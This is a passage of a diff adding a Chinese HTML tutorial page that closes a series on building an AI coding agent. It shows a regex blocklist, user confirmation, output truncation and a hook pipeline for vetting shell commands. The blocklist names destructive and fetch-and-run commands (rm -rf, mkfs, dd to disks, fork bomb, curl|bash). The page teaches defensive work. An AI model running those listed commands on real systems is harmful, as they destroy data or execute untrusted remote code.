+      <pre><code>DANGEROUS_PATTERNS = [
+    <span class="str">r'\brm\s+(-[a-zA-Z]*f[a-zA-Z]*\s+|.*--no-preserve-root)'</span>, <span class="cm"># rm -rf</span>
+    <span class="str">r'\bmkfs\b'</span>,                    <span class="cm"># 格式化磁盘</span>
+    <span class="str">r'\bdd\s+.*of\s*=\s*/dev/'</span>,     <span class="cm"># 覆写磁盘</span>
+    <span class="str">r'\bchmod\s+(-R\s+)?777\s+/'</span>,   <span class="cm"># chmod 777 /</span>
+    <span class="str">r':\(\)\s*\{'</span>,                  <span class="cm"># fork bomb</span>
+    <span class="str">r'\bcurl\b.*\|\s*(ba)?sh'</span>,      <span class="cm"># curl | bash</span>
+    <span class="str">r'\bwget\b.*\|\s*(ba)?sh'</span>,      <span class="cm"># wget | bash</span>
+    <span class="str">r'\bshutdown\b'</span>,                <span class="cm"># 关机</span>
+    <span class="str">r'\breboot\b'</span>,                  <span class="cm"># 重启</span>
+]
+
+<span class="kw">def</span> <span class="fn">is_dangerous</span>(command):
+    <span class="kw">for</span> pattern <span class="kw">in</span> DANGEROUS_PATTERNS:
+        <span class="kw">if</span> re.<span class="fn">search</span>(pattern, command):
+            <span class="kw">return</span> <span class="kw">True</span>, pattern
+    <span class="kw">return</span> <span class="kw">False</span>, <span class="kw">None</span></code></pre>
+    </div>
+
+    <h3>防线 2：用户确认</h3>
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dots"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span></div>
+        <div class="code-lang">Python · agent-safe.py（用户确认）</div>
+      </div>
+      <pre><code><span class="kw">def</span> <span class="fn">ask_user_confirmation</span>(tool_name, args):
+    <span class="kw">if</span> AUTO_APPROVE: <span class="kw">return</span> <span class="kw">True</span>  <span class="cm"># --auto 参数跳过确认</span>
+
+    <span class="fn">print</span>(<span class="str">f"\n┌─ 确认执行 ──────────────────────────"</span>)
+    <span class="fn">print</span>(<span class="str">f"│ 工具: {tool_name}"</span>)
+    <span class="kw">for</span> key, value <span class="kw">in</span> args.items():
+        <span class="fn">print</span>(<span class="str">f"│ {key}: {str(value)[:200]}"</span>)
+    <span class="fn">print</span>(<span class="str">f"└──────────────────────────────────────"</span>)
+
+    <span class="kw">while</span> <span class="kw">True</span>:
+        answer = <span class="fn">input</span>(<span class="str">"[Y]执行 / [N]跳过 / [Q]终止 Agent > "</span>).<span class="fn">strip</span>().<span class="fn">lower</span>()
+        <span class="kw">if</span>   answer <span class="kw">in</span> (<span class="str">'y'</span>, <span class="str">'yes'</span>, <span class="str">''</span>): <span class="kw">return</span> <span class="kw">True</span>
+        <span class="kw">elif</span> answer <span class="kw">in</span> (<span class="str">'n'</span>, <span class="str">'no'</span>):      <span class="kw">return</span> <span class="kw">False</span>
+        <span class="kw">elif</span> answer <span class="kw">in</span> (<span class="str">'q'</span>, <span class="str">'quit'</span>):   sys.<span class="fn">exit</span>(<span class="num">0</span>)</code></pre>
+    </div>
+
+    <h3>三道防线串联</h3>
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dots"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span></div>
+        <div class="code-lang">Python · agent-safe.py（execute_bash 完整实现）</div>
+      </div>
+      <pre><code><span class="kw">def</span> <span class="fn">execute_bash</span>(command):
+    <span class="cm"># 防线 1: 黑名单</span>
+    dangerous, pattern = <span class="fn">is_dangerous</span>(command)
+    <span class="kw">if</span> dangerous:
+        <span class="kw">return</span> <span class="str">f"🚫 命令被拦截（匹配: {pattern}）: {command}"</span>
+
+    <span class="cm"># 防线 2: 用户确认</span>
+    <span class="kw">if not</span> <span class="fn">ask_user_confirmation</span>(<span class="str">"execute_bash"</span>, {<span class="str">"command"</span>: command}):
+        <span class="kw">return</span> <span class="str">"用户跳过了此命令。"</span>
+
+    <span class="cm"># 实际执行</span>
+    <span class="kw">try</span>:
+        result = subprocess.<span class="fn">run</span>(command, shell=<span class="kw">True</span>, capture_output=<span class="kw">True</span>, text=<span class="kw">True</span>, timeout=<span class="num">30</span>)
+        output = result.stdout + result.stderr
+    <span class="kw">except</span> subprocess.TimeoutExpired:
+        output = <span class="str">"Error: 命令执行超时（30秒）"</span>
+
+    <span class="cm"># 防线 3: 输出截断</span>
+    <span class="kw">return</span> <span class="fn">truncate_output</span>(output)</code></pre>
+    </div>
+
+    <h3>进化方向：从硬编码到 Hook 管道</h3>
+    <div class="callout">
+      <div class="callout-title">架构进化</div>
+      三道防线目前是<strong>硬编码</strong>在函数里的。生产级框架会把它们抽象成 <strong>Hook（钩子）机制</strong>：一个可插拔的管道。加新检查只需往列表里 append 一个函数，不用改核心代码。这正是 Claude Code 的 hooks 系统的设计思路。
+    </div>
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dots"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span></div>
+        <div class="code-lang">Python · 进化方向（Hook 管道）</div>
+      </div>
+      <pre><code><span class="cm"># 可插拔的 Hook 管道（生产级实现思路）</span>
+before_hooks = [check_blacklist, ask_confirmation, log_command]
+after_hooks  = [truncate_output, log_result]
+
+<span class="kw">def</span> <span class="fn">execute_tool</span>(name, args):
+    <span class="kw">for</span> hook <span class="kw">in</span> before_hooks:           <span class="cm"># 执行前：依次过所有 hook</span>
+        blocked, msg = <span class="fn">hook</span>(name, args)
+        <span class="kw">if</span> blocked: <span class="kw">return</span> msg           <span class="cm"># 任何一个 hook 可以拦截</span>
+
+    result = available_functions[name](**args)  <span class="cm"># 实际执行</span>
+
+    <span class="kw">for</span> hook <span class="kw">in</span> after_hooks:            <span class="cm"># 执行后：依次过所有 hook</span>
+        result = <span class="fn">hook</span>(name, result)
+
+    <span class="kw">return</span> result</code></pre>
+    </div>
+
+    <div class="summary-box">
+      <h4>第七篇核心要点</h4>
+      <ul>
+        <li><strong>黑名单用纯正则</strong>：不需要 AI 判断，最简单的往往最可靠</li>
+        <li><strong>拦截信息返回给 LLM</strong>：LLM 看到拦截信息后会自适应调整策略，换一种安全方式完成任务</li>
+        <li><strong>截断保留首尾</strong>：开头有文件头/标题，结尾有最新结果/错误信息，中间细节可以丢</li>
+        <li><strong>能力与约束是一体两面</strong>：前六篇回答"能做什么"，第七篇回答"不能做什么"</li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+<!-- ── 系列收官 ── -->
+<section class="section">
+  <div class="section-header">
+    <div class="section-num" style="background:linear-gradient(135deg,var(--green),var(--teal));font-size:18px;">✓</div>
+    <div class="section-title-wrap">
+      <div class="section-eyebrow">Series Complete</div>
+      <h2 class="section-title">系列收官：完整的 Agent 认知体系</h2>
+    </div>
+  </div>
+
+  <div class="content">
+    <div class="timeline">
+      <div class="timeline-item">
+        <div class="timeline-dot-wrap"><div class="timeline-dot">01</div><div class="timeline-line"></div></div>
+        <div class="timeline-content">
+          <div class="timeline-title">装了引擎 ——工具 + 循环</div>
+          <div class="timeline-desc">100 行代码，LLM 是大脑，代码是手脚，循环驱动自主执行</div>
+        </div>
+      </div>
+      <div class="timeline-item">
+        <div class="timeline-dot-wrap"><div class="timeline-dot">02</div><div class="timeline-line"></div></div>
+        <div class="timeline-content">
+          <div class="timeline-title">装了后视镜和导航 ——记忆 + 规划</div>
+          <div class="timeline-desc">文件持久化记忆，Plan-then-Execute 让 Agent 有全局视角</div>
+        </div>
+      </div>
+      <div class="timeline-item">
+        <div class="timeline-dot-wrap"><div class="timeline-dot">03</div><div class="timeline-line"></div></div>
+        <div class="timeline-content">
+          <div class="timeline-title">装了可换配件和使用手册 ——Rules + Skills + MCP</div>
+          <div class="timeline-desc">声明式约束文件，可插拔技能，MCP 工具协议实现工具生态</div>
+        </div>
+      </div>
+      <div class="timeline-item">
+        <div class="timeline-dot-wrap"><div class="timeline-dot">04</div><div class="timeline-line"></div></div>
+        <div class="timeline-content">
+          <div class="timeline-title">能叫外援 ——SubAgent</div>
+          <div class="timeline-desc">30 行新增代码，一次性临时工，独立上下文，专业角色分工</div>
+        </div>
+      </div>
+      <div class="timeline-item">
+        <div class="timeline-dot-wrap"><div class="timeline-dot">05</div><div class="timeline-line"></div></div>
+        <div class="timeline-content">
+          <div class="timeline-title">组建车队 ——Teams</div>
+          <div class="timeline-desc">Agent 类 + Team 类，持久记忆，身份管理，收件箱通信</div>
+        </div>
+      </div>
+      <div class="timeline-item">
+        <div class="timeline-dot-wrap"><div class="timeline-dot">06</div><div class="timeline-line"></div></div>
+        <div class="timeline-content">
+          <div class="timeline-title">装了油量警告灯 ——上下文压缩</div>
+          <div class="timeline-desc">锯齿波模式，旧消息 LLM 摘要，最近 N 条完整保留</div>
+        </div>
+      </div>
+      <div class="timeline-item">
+        <div class="timeline-dot-wrap"><div class="timeline-dot" style="background:linear-gradient(135deg,var(--red),var(--orange))">07</div></div>
+        <div class="timeline-content">
+          <div class="timeline-title">装了刹车和安全气囊 ——安全防线</div>
+          <div class="timeline-desc">黑名单 + 用户确认 + 输出截断，向 Hook 管道进化</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="callout green" style="margin-top:32px;">
+      <div class="callout-title">🎓 贯穿全系列的核心设计思想</div>
+      <strong>一切能力都是"工具"。</strong>读文件是工具，写文件是工具，规划是工具（第三篇），派出子智能体也是工具（第四篇）。LLM 通过统一的 Function Calling 协议按需调用，代码通过统一的路由表执行——这就是 OpenClaw、Claude Code、Cursor Agent 底层的共同基础。
+    </div>
+
+    <div style="text-align:center;padding:32px 0 8px;">
+      <div style="font-size:13px;color:var(--text2);margin-bottom:12px;">开源项目</div>
+      <a href="https://github.com/GitHubxsy/nanoAgent" target="_blank"
+         style="display:inline-flex;align-items:center;gap:8px;background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:10px 20px;text-decoration:none;color:var(--text);font-size:14px;font-weight:600;transition:border-color 0.2s;"
+         onmouseover="this.style.borderColor='#58a6ff'" onmouseout="this.style.borderColor='var(--border)'">
+        ⭐ GitHubxsy/nanoAgent
+      </a>
+    </div>
+  </div>
+</section>
+
+</main>
+
+<script>
+function setActive(el) {
+  document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+  el.classList.add('active');
+}
+
+// Update active nav on scroll
+const sections = document.querySelectorAll('[id^="s"]');
+const navItems = document.querySelectorAll('.nav-item');
+
+const observer = new IntersectionObserver((entries) => {
+  entries.forEach(entry => {
+    if (entry.isIntersecting) {
+      const id = entry.target.id;
+      navItems.forEach(nav => {
+        nav.classList.remove('active');
+        if (nav.getAttribute('href') === '#' + id) {
+          nav.classList.add('active');
+        }
+      });
+    }
+  });
+}, { rootMargin: '-20% 0px -70% 0px' });
+
+sections.forEach(s => observer.observe(s));
+</script>
+</body>
+</html>
